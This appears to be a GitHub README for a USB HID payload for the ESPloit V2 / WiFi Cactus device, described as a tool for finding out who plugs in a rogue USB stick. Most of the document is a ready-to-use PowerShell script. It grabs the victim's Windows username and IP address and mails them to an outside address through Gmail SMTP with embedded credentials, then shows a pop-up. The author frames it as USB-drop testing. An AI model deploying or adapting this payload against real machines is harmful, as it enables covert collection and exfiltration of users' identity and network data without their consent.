# IP-Hostname-USB-Payload
ESPloit V2 Cactus WiFi/HID Payload - IP&Hostname Grab

This is formatted for ESPloit V2 by Corey Harding

Used in a WiFi Cactus
Resource for ESPloit: https://github.com/exploitagency/ESPloitV2

This payload uses Powershell to grab the current username and IP address of the victims workstation and then uses gmail to send it back to the target source email account.
The IP and Hostname payload is primarily used to enumerate users who plug in a rogue USB. It takes about 1.5 seconds to run, and if interrupted could fail to resolve.

At the end of the PSX script there is also a system message that alerts the user. Our use case was to return the USB to the proper point of contact but can be modified or removed.

You can find the raw PSX below in case you want to put this into a Ducky Script. I will attempt to add the full Ducky Script at a later date once I have one to debug on. 

$name = "<gmailsource>@gmail.com";
$pass = "<gmailsourcepass>" | ConvertTo-SecureString -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential("$name",$pass);
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address | Out-String; $From = "<gmailsource>@gmail.com";
$To = "<destination>@<domain>.com";
$Cc = "<destination2>@<domain>.com";
$Subject = "Email Subject";
$Body = "`n`n`nHostname and User: `n$user `n$ipV4"; $SMTPServer = "smtp.gmail.com";
$SMTPPort = "587";
Send-MailMessage -From $From -to $To -Cc $Cc -Subject $Subject ` -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl ` -Credential $creds;
msg $env:UserName <enter message here>
